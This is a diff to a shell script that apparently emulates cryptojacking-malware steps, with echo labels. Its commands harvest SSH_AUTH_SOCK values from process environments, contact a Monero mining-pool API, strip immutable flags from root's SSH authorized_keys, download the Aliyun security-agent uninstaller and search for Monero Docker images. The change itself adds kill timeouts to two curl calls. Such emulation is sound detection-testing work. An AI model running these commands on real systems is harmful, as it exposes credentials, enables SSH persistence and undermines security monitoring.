@@ -119,14 +119,14 @@ ps ef |grep -i -e "ssh-agent"
 cat /proc/*/environ |tr -s '\0' '\n' | grep SSH_AUTH_SOCK |sort -u 2>/dev/null > ssh_agent.txt
 
 echo DNS Request for mining pool
-timeout 5 curl https://api.nanopool.org/
+timeout -s SIGKILL 5 curl https://api.nanopool.org/
 
 echo Set SSH Key Access
 chattr -iae /root/.ssh/
 chattr -iae /root/.ssh/authorized_keys
 
 echo Download Aliyun Agent Uninstaller
-curl http://update.aegis.aliyun.com/download/uninstall.sh
+timeout -s SIGKILL 5 curl http://update.aegis.aliyun.com/download/uninstall.sh
 
 echo Search for Monero Docker images
 docker images -a | grep "auto"
